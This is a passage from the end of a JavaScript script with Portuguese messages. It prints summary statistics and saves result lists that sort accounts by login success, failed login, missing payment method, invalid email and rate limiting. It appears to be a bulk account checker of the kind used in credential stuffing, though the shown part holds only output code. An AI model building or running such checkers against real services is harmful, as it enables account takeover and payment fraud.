    console.log(`║  ⏱️  Rate Limited:          ${String(stats.rateLimited).padStart(4)}                           ║`);
    console.log(`║  💥 Erros:                 ${String(stats.errors).padStart(4)}                           ║`);
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log(`║  📁 Total Verificadas:     ${String(stats.total).padStart(4)}                           ║`);
    console.log('╚════════════════════════════════════════════════════════════╝');
    console.log('');
    
    log('VERIFICADOR', '✅ Verificação concluída!');
    log('INFO', 'Resultados salvos em:');
    log('INFO', `  - verificador_completed.txt (${stats.completed} contas)`);
    log('INFO', `  - verificador_failed.txt (${stats.failed} contas)`);
    log('INFO', `  - verificador_login_failed.txt (${stats.loginFailed} contas)`);
    log('INFO', `  - verificador_no_payment.txt (${stats.noPayment} contas)`);
    log('INFO', `  - verificador_invalid_email.txt (${stats.invalidEmail} contas)`);
    log('INFO', `  - verificador_rate_limited.txt (${stats.rateLimited} contas)`);
}

// Executar
main().catch(error => {
    log('ERRO', `Erro fatal: ${error.message}`);
    process.exit(1);
});
